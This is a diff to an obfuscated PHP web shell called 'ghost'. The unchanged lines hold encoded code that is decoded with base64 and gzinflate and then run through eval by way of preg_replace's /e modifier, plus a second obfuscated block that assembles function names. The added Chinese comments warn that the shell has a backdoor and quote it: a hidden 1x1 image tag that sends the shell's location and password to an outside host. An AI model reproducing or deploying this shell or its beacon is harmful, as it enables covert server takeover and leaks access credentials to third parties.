@@ -1,6 +1,12 @@
 <?php $code='JElJSUlJSTFJSUlJST0nb3JkJzskSUlJSUlJbDExMTExPSdjaHInOyRJSUlJSUlsSUkxMUk9J2Jhc2U2NF9kZWNvZGUnOyRJSUlJSUlsMTExMWw9J2d6aW5mbGF0ZSc7';
 $x=str_replace('f',"","bfafsfef6f4f_ffdffeffcffoffdffef");
 preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'($x($code))','a');
+
+//这个ghost有后门，请大家使用时注意下，感谢网友fuweijunya提示，后门代码：
+//<img width=1 height=1 src="http://websafe.facaiok.com/just7z/sx.asp?u=***.***.***.***/ghost.php&p=ghost"/>
+//已经更新了这个shell并解密删除了上述后门地址，新shell名称为ghost_source.php
+//如有错误，请予以勘正，谢谢。
+
 ?>
 <?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64');
 $OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5};$OOO0000O0.=$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16}; $OOO0000O0.=$OOO0000O0{3}.$OOO000000{11}.$OOO000000{12}.$OOO0000O0{7}.$OOO000000{5};$O0O0000O0='OOO0000O0';?>
